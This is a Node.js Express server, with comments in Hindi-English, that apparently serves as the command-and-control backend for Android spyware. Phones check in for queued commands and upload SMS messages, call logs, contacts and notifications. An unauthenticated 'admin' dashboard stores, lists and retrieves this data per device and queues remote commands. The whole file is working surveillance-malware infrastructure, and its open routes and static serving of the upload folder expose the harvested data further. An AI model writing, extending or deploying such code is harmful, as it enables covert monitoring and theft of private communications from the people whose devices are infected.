const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Live memory devices ka status rakhne ke liye
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE (App Side)
// ==================================================

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    // ID hamesha uppercase rakho taaki mismatch na ho
    device_id = device_id.toUpperCase();

    // Check if there is a pending command
    const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";

    // Device status update karo memory mein
    devicesStatus[device_id] = {
        id: device_id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" // Command nikalte hi memory se reset
    };

    console.log(`📡 Ping: ${model} [${device_id}] | Bat: ${battery}% | Cmd: ${pendingCommand}`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    device_id = device_id.toUpperCase();

    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    try {
        let finalData;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];

        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            if (Array.isArray(parsedData)) {
                finalData = [...parsedData, ...existingData].slice(0, 2000); 
            } else {
                existingData.unshift(parsedData);
                finalData = existingData.slice(0, 2000);
            }
        } else {
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`📥 Saved ${type} for: ${device_id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("Save Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (Admin Side)
// ==================================================

// Specific Device Status (Fix: Memory check + Folder scan)
app.get('/api/device-status/:id', (req, res) => {
    const devId = req.params.id.toUpperCase();
    let device = devicesStatus[devId];
    
    // Agar memory mein nahi hai (server restart), toh offline return karo
    if (!device) {
        return res.json({ 
            id: devId,
            model: "Device Offline",
            isOnline: false,
            battery: "--",
            command: "none"
        });
    }

    const isOnline = (Date.now() - device.lastSeen) < 60000; 
    res.json({ 
        ...device, 
        isOnline 
    });
});

// Saare Devices ki list
app.get('/api/admin/all-devices', (req, res) => {
    const files = fs.readdirSync(UPLOADS_DIR);
    let deviceList = {};

    files.forEach(file => {
        const deviceId = file.split('_')[0].toUpperCase();
        if (!deviceList[deviceId]) {
            const isOnline = devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false;
            deviceList[deviceId] = {
                id: deviceId,
                model: devicesStatus[deviceId]?.model || "Unknown Device",
                isOnline: isOnline,
                battery: devicesStatus[deviceId]?.battery || "--"
            };
        }
    });
    res.json(deviceList);
});

// Specific Data Fetch
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const devId = req.params.device_id.toUpperCase();
    const type = req.params.type;
    const filePath = path.join(UPLOADS_DIR, `${devId}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); 
    }
});

// Command Bhejna (Silent/Normal etc)
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if(!device_id) return res.status(400).json({error: "ID required"});
    
    device_id = device_id.toUpperCase();

    if (!devicesStatus[device_id]) {
        devicesStatus[device_id] = { id: device_id, model: "Connecting..." };
    }
    
    devicesStatus[device_id].command = command;
    console.log(`🚀 Command [${command}] queued for -> ${device_id}`);
    res.json({ status: "success", queuedCommand: command });
});

app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
});
